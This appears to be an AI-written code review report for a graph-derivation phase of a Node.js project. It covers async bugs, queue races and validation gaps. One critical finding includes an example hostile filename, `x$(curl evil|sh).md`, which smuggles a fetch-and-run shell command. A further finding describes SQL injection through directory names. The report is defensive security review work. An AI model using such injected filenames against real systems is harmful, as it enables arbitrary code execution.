---
phase: 224-graph-derivation-harness-seed-034-make-room-db-s-typed-node-
reviewed: 2026-07-15T10:49:38Z
depth: standard
files_reviewed: 25
files_reviewed_list:
  - commands/graph.md
  - docs/ENV-TUNING.md
  - lib/core/graph-backfill.cjs
  - lib/core/graph-derivation.cjs
  - lib/core/graph-derive-classifier.cjs
  - lib/core/intelligence-cascade.cjs
  - lib/core/migrations/phase-224-edge-review-status.cjs
  - lib/core/navigation/edges.cjs
  - lib/core/navigation/memory-events.cjs
  - lib/core/room-db.cjs
  - lib/memory/run-feynman-tests.cjs
  - scripts/gsd-artifact-graph-hook.cjs
  - scripts/gsd-graph-derive-drain.cjs
  - scripts/gsd-graph-derive-sweep.cjs
  - tests/helpers/fixture-room-224.cjs
  - tests/run-all-224.sh
  - tests/test-224-backfill-idempotent.cjs
  - tests/test-224-classifier.cjs
  - tests/test-224-cost-bound.cjs
  - tests/test-224-encoder-skip.cjs
  - tests/test-224-migration.cjs
  - tests/test-224-per-write-derive.cjs
  - tests/test-224-proposed-only.cjs
  - tests/test-224-resolver-fallback.cjs
  - tests/test-derive-backfill-acceptance.cjs
findings:
  critical: 2
  warning: 12
  info: 5
  total: 19
status: issues_found
---

# Phase 224: Code Review Report

**Reviewed:** 2026-07-15T10:49:38Z
**Depth:** standard
**Files Reviewed:** 25
**Status:** issues_found

## Summary

Phase 224 wires per-write typed-edge derivation (enqueue + detached drain), the score-based CONVERGES/INFORMS classifier, the edges.review_status column, and the backfill deriver swap. The phase's four constitutional constraints were verified against the code and HOLD:

- Cascade Step 2b is enqueue + detached-spawn only (no inline `scoreMeasured`; `intelligence-cascade.cjs:349-371` uses argv-array `spawn`, no shell, unref'd, never awaited).
- The classifier structurally emits only CONVERGES / INFORMS / null (`graph-derive-classifier.cjs:98-106`); no path emits a stance edge from score-only input.
- Zero network/Brain egress in the new derivation modules; `scoreMeasured` rides the local embedding spine (the run-all-224.sh Part 8 sweep is a live tripwire).
- The migration + `writeEdge` ON CONFLICT never demote NULL legacy edges and never downgrade `confirmed` (`edges.cjs:741-743`, proven by test-224-migration Test 5).

However, the async-producer hazard the phase itself documents is NOT fully closed: `runDerivation`'s own default path still treats the default async producer's Promise as `[]` (CR-01), and the detached drain / queue file carry real race and lifetime defects (WR-01/02/03) exactly in the zone this review was directed to probe. A pre-existing command-injection sink in the reviewed cascade file is also flagged (CR-02).

## Critical Issues

### CR-01: runDerivation's default producer path silently derives nothing (Promise treated as [])

**File:** `lib/core/graph-derivation.cjs:180-183`, `lib/core/graph-candidate-producer.cjs:184-186`
**Issue:** `deriveForPair` runs `const candidates = deriveFn(...); return Array.isArray(candidates) ? candidates : [];`. The module's DEFAULT `deriveFn` (`graph-candidate-producer.produceCandidates` with the default anthropic transport, `graph-derivation.cjs:163-165`) returns a Promise, which this line silently discards as `[]`. Every default-path `runDerivation` call therefore derives ZERO edges with no error and no disclosure - the exact "Promise treated as []" failure class this phase was built to eliminate (it is the mechanical twin of the twice-reconfirmed 0-typed-edge gap). The comment at lines 177-179 ("both are accepted") and produceCandidates' docstring ("The runDerivation loop awaits the return either way", producer line ~186) are both false. Today's shipped callers (backfill, drain) pre-resolve and inject sync wrappers, so the defect is latent - but it is the module's documented public default, and any future caller (e.g. the graph.md STEP 3 "call runDerivation once per room" instruction taken literally) hits silent zero-derivation.
**Fix:** Make the composer honest about async producers, e.g.:
```js
function deriveForPair(pair) {
  const candidates = deriveFn({ roomDir, artifactPair: pair, llm: opts.llm });
  if (candidates && typeof candidates.then === 'function') {
    throw new Error('runDerivation: async deriveFn requires pre-resolution (use the drain/backfill wrappers)');
    // or: return await via an async runDerivation variant
  }
  return Array.isArray(candidates) ? candidates : [];
}
```
At minimum, fail loudly (or trace `{ dropped: 'promise_deriveFn' }`) instead of silently returning `[]`, and correct the two false docstrings.

### CR-02: Command injection via interpolated file path in the cascade's execSync calls

**File:** `lib/core/intelligence-cascade.cjs:319` (also 413, 418, 434, 446, 462, 481, 494, 507)
**Issue:** Step 1 runs `` execSync(`bash "${classifyScript}" "${fp}"`) `` where `fp` is the written file's path. A filename containing `$(...)`, backticks, or `"` executes arbitrary shell when the PostToolUse cascade fires automatically on the write. A `.md` file named `x$(curl evil|sh).md` (e.g. extracted from an untrusted archive into a room) is sufficient - the `isMd` gate does not sanitize the rest of the name. The same interpolation pattern applies to `roomDir` at the other listed sites. NOTE: this predates Phase 224 (the phase's own Step 2b insertion correctly uses argv-array `spawn`), but the file is in scope and the sink is a real arbitrary-code-execution vector on an automatic hook path.
**Fix:** Replace shell-string `execSync` with argv-array `execFileSync`:
```js
const classifyOutput = execFileSync('bash', [classifyScript, fp], {
  timeout: HSI_TIMEOUT_MS, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe']
}).trim();
```
Apply the same conversion to every `execSync` site that interpolates `fp` or `roomDir`.

## Warnings

### WR-01: Drain's clearQueue wipes entries enqueued during the drain window (lost derive requests) + non-atomic queue writes

**File:** `scripts/gsd-graph-derive-drain.cjs:69-75, 169, 202`; `scripts/gsd-graph-derive-sweep.cjs:129-150`
**Issue:** The drain snapshots the queue, spends seconds-to-minutes scoring, then `clearQueue()` unconditionally writes `{entries: []}` - erasing any entry a live session enqueued AFTER the snapshot. The header's "CLEARS the drained entry" claim does not match the clear-everything implementation. Separately, `enqueueDerive` is a lockless read-modify-write with a non-atomic `fs.writeFileSync` (no tmp+rename): two concurrent enqueues lose one entry, and a reader hitting a partial write parses as corrupt and `readQueue` silently starts fresh (`sweep.cjs:97-104`), discarding the whole queue. Impact is bounded (the Stop sweep re-enqueues room-scoped and the backfill is the net) but per-write entries are silently droppable, and the "queue-file corruption handling" degrade is undisclosed.
**Fix:** In `clearQueue`, re-read the queue and remove only the entries in the drained snapshot (compare by roomDir+filePath+enqueued_at); write queue updates atomically (tmp file + `fs.renameSync`), matching the brain-derivation-queue `writeQueueAtomic` precedent this file cites as its idiom.

### WR-02: SessionStart drain cannot finish real scoring inside its 5000ms blocking hook budget; stuck queue re-stalls every session start

**File:** `hooks/hooks.json:108-119` (drain registration, `timeout: 5000`, `async: false`); `scripts/gsd-graph-derive-drain.cjs:174-204`
**Issue:** A room-scoped Stop-sweep entry drains via `buildAllPairs` = N-choose-2 encoder scorings with no pair cap and no time budget. The cold transformers.js encoder load alone typically exceeds 5s. When the hook is killed at timeout: (a) NO edges land for that entry, because all pairs are scored into `candidatesByPair` BEFORE `runDerivation` writes anything - zero incremental progress; (b) `clearQueue` never runs, so the entry survives and the SAME doomed drain re-runs at every session start, stalling startup by the full 5s indefinitely. The backfill got a chunking pass for T-224-13; the hook-path drain got neither a bound nor incremental writes.
**Fix:** Either (a) write per-pair: call `runDerivation` per chunk (or per pair) so partial progress lands and the entry can be re-scoped, plus persist a cursor; or (b) cap the hook-path drain (e.g. skip room-scoped entries whose pair count exceeds a budget, disclose via a `derivation_skipped`-style marker, and defer to `/mos:graph --derive`); or (c) have the hook spawn the drain detached (like Step 2b) instead of running it blocking.

### WR-03: Detached-drain stampede - one spawn per markdown write, each processing the full queue concurrently

**File:** `lib/core/intelligence-cascade.cjs:357-369`; `scripts/gsd-graph-derive-drain.cjs` (no lock)
**Issue:** Step 2b spawns a detached drain per md file. A 10-file batch spawns 10 drain processes near-simultaneously; each reads the queue immediately (before any finishes), so ALL of them score ALL entries - 10 concurrent encoder loads and duplicate O(n) scoring against the same room.db. The Step 2b comment's claim that "extra spawned drains no-op on the already-cleared queue" is only true if the first drain wins the race, which it essentially never does for a batch. Correctness survives via idempotent writes, but a contended `writeEdge` that exhausts the 5s busy timeout returns `ok:false` and the edge is silently lost until the next net (`graph-derivation.cjs:279-287` records `edgeOk` but nothing retries or disclosed-logs it).
**Fix:** Add a cheap single-flight guard to the drain (e.g. `fs.openSync(queueDir + '/derive-drain.lock', 'wx')` with a stale-lock TTL, the repo's existing write-lock idiom), and/or have the cascade skip the spawn when `enq.queued === false` (the entry was already pending, so a drain is already in flight).

### WR-04: runDeriveBackfill's AsyncFunction-name sniffing misroutes promise-returning plain functions into the Promise-as-[] path

**File:** `lib/core/graph-backfill.cjs:439-440`
**Issue:** `useAsync` is decided by `deriveFn.constructor.name === 'AsyncFunction'`. An injected arrow/plain function that RETURNS a Promise (e.g. `(step) => scoreBasedDeriveFn(step, opts)` - the exact wrapper shape test-224-per-write-derive builds for the drain), a `.bind()`ed async fn, or a transpiled async fn all report `'Function'`, take the sync runner, and feed the raw promise-returning fn to `runDerivation`, where every Promise becomes `[]` - silent zero derivation with a "successful" result object. The backfill test only avoids this because its wrapper is declared `async function` (test file line 70), which suggests the author hit the trap.
**Fix:** Detect by probing the RETURN value instead of the constructor name: call the deriveFn once (or wrap every injected deriveFn in the async runner unconditionally) and branch on `result && typeof result.then === 'function'`. Simplest safe form: always use `_runBackfillAsync` for injected functions too - the await of a sync deriveFn's plain array is a no-op.

### WR-05: _rebuildRoom is fired and never awaited - rebuild races derivation and the after-count

**File:** `lib/core/graph-backfill.cjs:324, 372`
**Issue:** `_rebuildRoom(t)` is async but invoked without `await` in BOTH runners, including `_runBackfillAsync` where awaiting is trivially possible. The rebuild opens the same room.db concurrently with `runDerivation`'s sync open (busy-timeout contention), derivation may run against a not-yet-rebuilt index (STEP 2 "rebuild ... so the flat-root b2 artifacts index" before STEP 3 is not actually sequenced), and `_countTypedEdges` for the after-report can read mid-rebuild.
**Fix:** `await _rebuildRoom(t);` in `_runBackfillAsync`. In `_runBackfillSync`, either accept and document the race explicitly or hoist the rebuild into an awaited pre-pass shared by both runners.

### WR-06: writeEdge's ON CONFLICT overwrites the existing edge's properties - the derivation writer can clobber legacy/confirmed edge metadata

**File:** `lib/core/navigation/edges.cjs:740-743`
**Issue:** `ON CONFLICT(source, target, type) DO UPDATE SET properties = excluded.properties` protects `review_status` but replaces the ENTIRE properties JSON. When the score-based deriver (or the cue fallback, which can emit INFORMS/CONTRADICTS/etc.) collides with a pre-existing edge of the same (source, target, type) written by another surface - a lens-engine INFORMS with a decision handle, a REFINES with TV-01 `valid_from`/`valid_until` scalars - those scalars are destroyed and replaced with `{relation:'derived', reason:...}`. test-224-migration Test 5 (line 177) asserts this clobber as "the existing contract", but Phase 224 materially raises the collision frequency: an automatic background writer now upserts the same key space humans and other systems write.
**Fix:** For the derivation writer, merge instead of replace (e.g. `json_patch(properties, excluded.properties)` or read-merge-write), or skip the properties update entirely when the existing row's `review_status` is `'confirmed'` or NULL (mirror the review_status invariant onto properties for non-proposal rows).

### WR-07: Derivation floor env validation accepts 0 and permits band inversion - contradicting the documented guarantee

**File:** `lib/core/graph-derive-classifier.cjs:71-86`; `docs/ENV-TUNING.md:159-164`
**Issue:** ENV-TUNING.md promises "a malformed operator env can never zero out or invert derivation", but `resolveFloor` accepts any value in `[0, 1]`: `DERIVE_CONVERGES_FLOOR=0` makes EVERY non-negative pair a CONVERGES proposal (the false-proposal flood the phase was designed against), and setting `DERIVE_CONVERGES_FLOOR` below `DERIVE_INFORMS_FLOOR` inverts the bands (the INFORMS band vanishes; low scores become CONVERGES). Compare `MINDRIAN_WHATWHY_MARGIN`, whose documented contract explicitly rejects 0.
**Fix:** In `resolveFloors()`, require `v > 0`, and enforce the invariant `converges >= informs` (fall back BOTH to defaults when violated), then align the ENV-TUNING.md wording with the actual guard.

### WR-08: Encoder failure after a passing probe is a silent skip with no disclosure (probe-then-score TOCTOU; probeOpts not threaded to scoring)

**File:** `scripts/gsd-graph-derive-drain.cjs:161-172, 188`; `lib/core/graph-backfill.cjs:360-369, 383`; `lib/core/graph-derive-classifier.cjs:165-167`
**Issue:** D-04 disclosure is decided by a ONE-TIME probe. If the encoder degrades mid-run (or the probe seam is fed an injected `encodeFn` via `probeOpts` while the real scoring path - which never receives `probeOpts`/`scoreOpts` - uses the actual encoder), every subsequent pair returns `[]` under the classifier's "upstream silence" rule and NO `derivation_skipped` marker is written. The result is exactly the silent 0-edge outcome D-04 exists to prevent, reported as a successful drain. The probe/score seam asymmetry also means test-224-cost-bound's `probeOpts: { encodeFn }` proves availability with a stub the production scorer never uses.
**Fix:** Count per-pair `encoder_unavailable`/null-semantic outcomes in the drain and backfill loops (have `scoreBasedDeriveFn` return a distinguishable marker or accept an outcome callback); when the count is non-zero, write the `derivation_skipped` disclosure with the affected pair count. Thread one shared `scoreOpts` through both the probe and the scoring calls so the seam cannot diverge.

### WR-09: Heal gate is all-or-nothing - a single approvedBy heals every detected folder; per-folder APPROVE/REJECT is not expressible

**File:** `lib/core/graph-backfill.cjs:271-285`; `commands/graph.md:180-191`
**Issue:** graph.md specifies a Part 3 Decision Gate PER detected folder ("Offer APPROVE / REJECT (with reason) / DEFER. ONLY on APPROVE do you call healRoom"). The API heals ALL detected folders whenever `approvedBy` is non-empty - approving one folder while rejecting another in the same run is impossible, and a command invocation that sets `MOS_APPROVED_BY` globally (the graph.md snippet does exactly this) batch-heals everything found, including folders the navigator never saw.
**Fix:** Accept a per-folder approval map (e.g. `approvals: { [folder]: approvedBy }`) or an `approveFolders: []` allow-list on `runDeriveBackfill`, and update the graph.md snippet to gate per folder before invoking the heal.

### WR-10: writeEdge accepts review_status 'confirmed' from any caller with no byUser attribution

**File:** `lib/core/navigation/edges.cjs:707-729`
**Issue:** The optional `review_status` param admits `'confirmed'` at first insert from ANY caller. The migration header (`phase-224-edge-review-status.cjs:26-31`) reserves `'confirmed'` for "the explicit human byUser confirmation path", and Canon Part 9 says only a human confirms - but the chokepoint enforces nothing: no `byUser` handle is required, so a background writer can mint human-trust edges. Phase 224 code never passes it (the test-224-proposed-only sweep proves that for the phase's own modules), but the invariant currently rests on convention plus per-phase grep sweeps rather than on the chokepoint.
**Fix:** Require an attribution param when `review_status === 'confirmed'` (e.g. reject with `confirmed_requires_by_user` unless `params.byUser` is a non-empty string) and record it in properties, mirroring the confirmNode path's discipline.

### WR-11: gsd-artifact-graph-hook opens room.db raw, bypassing the Phase-218 busy-timeout write-safety

**File:** `scripts/gsd-artifact-graph-hook.cjs:159-160`
**Issue:** The hook constructs `new sqlite.DatabaseSync(dbPath)` directly with NO `timeout: 5000`, while `room-db.cjs:108-118` documents busy-timeout as a GLOBAL write-safety fold precisely because background workers (now including the Phase-224 detached drain) contend with live writes on the same WAL. A reconcile write during an in-flight drain fails instantly with SQLITE_BUSY instead of busy-waiting; the error is swallowed and the reconcile silently no-ops until session-start. This file was modified this phase (Req 3), so the omission is in scope.
**Fix:** `db = new sqlite.DatabaseSync(dbPath, { timeout: 5000 });` (or route through `openRoomDb` if the migration-chain cost is acceptable on this path).

### WR-12: rollupSubRooms interpolates the child db path into ATTACH SQL - breakage and SQL injection via directory names

**File:** `lib/core/graph-derivation.cjs:363` (and the URI open at 413)
**Issue:** `parentConn.exec("ATTACH DATABASE 'file:" + childDbPath + "?mode=ro' AS rollup_child")` splices a filesystem path into a SQL string. A path containing an apostrophe (`~/jonathan's rooms/...` is a realistic folder name) breaks the statement - the child silently contributes nothing - and a crafted directory name can inject arbitrary SQL on the parent connection (e.g. ATTACH a second db read-write). Pre-existing Phase 169 code, but it is the read-side of the edges this phase derives.
**Fix:** Use a parameterized ATTACH: `parentConn.prepare('ATTACH DATABASE ? AS rollup_child').run('file:' + encodeURIComponentPath(childDbPath) + '?mode=ro')`, or at minimum escape single quotes in the path before splicing.

## Info

### IN-01: test-224-backfill-idempotent leaks its temp fixtures

**File:** `tests/test-224-backfill-idempotent.cjs:103, 131, 161`
**Issue:** `tmp1`, `tmp3`, `tmp4` are never removed (sibling tests all `fs.rmSync` in `finally`). Repeated runs accumulate 21-artifact fixture rooms in the OS tmpdir.
**Fix:** Track the mkdtemp dirs and remove them in a `finally` around `main()`, matching test-224-classifier's pattern.

### IN-02: The no-confirm sweep omits graph-derivation.cjs - the module that actually writes the edges

**File:** `tests/test-224-proposed-only.cjs:96-103`
**Issue:** The Test 5 module list sweeps five surfaces but excludes `graph-derivation.cjs` (which legitimately contains `'confirmed'` read-comparisons at lines 244-246, so a naive literal grep would false-positive). The exclusion means a future write-position `'confirmed'` in the one module holding the writeEdge call would pass the sweep.
**Fix:** Include graph-derivation.cjs with a write-position-aware pattern (e.g. flag only `review_status:\s*['"]confirmed` / `confirmNode(`), keeping the read-only comparisons legal.

### IN-03: writeEdge returns a fabricated edge_id that is never persisted

**File:** `lib/core/navigation/edges.cjs:738, 747`
**Issue:** `edge_id` is minted from `Date.now()` + random bytes and returned as if it identified the row, but the edges table has no id column and on conflict the "id" refers to nothing. Callers storing it get a dangling handle.
**Fix:** Return the natural key (`{source, target, type}` is already returned) and drop or clearly document `edge_id` as ephemeral.

### IN-04: BACKFILL_PAIR_CHUNK does not bound anything - the comment overstates it

**File:** `lib/core/graph-backfill.cjs:211-215, 375-390`
**Issue:** The chunk loop awaits each pair sequentially; "so a large room does not fan out unbounded (T-224-13)" is misleading - there is no fan-out at all, and no cap on total pairs either. The chunk only paces the stderr progress line. The T-224-13 DoS concern (an O(n^2) room) is mitigated only by this path being navigator-triggered.
**Fix:** Correct the comment; if T-224-13 intended a real bound, add a max-pairs ceiling with a disclosed skip.

### IN-05: commands/graph.md query guidance is stale on both the edge vocabulary and review_status

**File:** `commands/graph.md:128-131` (schema reference), `95-108` (translation guide)
**Issue:** The schema reference omits REFINES, ROOT_CAUSES, NESTED_WITHIN and the review_status column this phase added, so Larry's generated SQL presents machine-PROPOSED edges as indistinguishable from confirmed knowledge in answers ("There is a contradiction between..."), undercutting the phase's own proposal-vs-ratified discipline at the read surface.
**Fix:** Add `review_status` to the schema reference, extend the edge-type list, and add a framing rule: annotate `review_status='proposed'` edges as "proposed (unconfirmed)" in every rendered answer.

---

_Reviewed: 2026-07-15T10:49:38Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
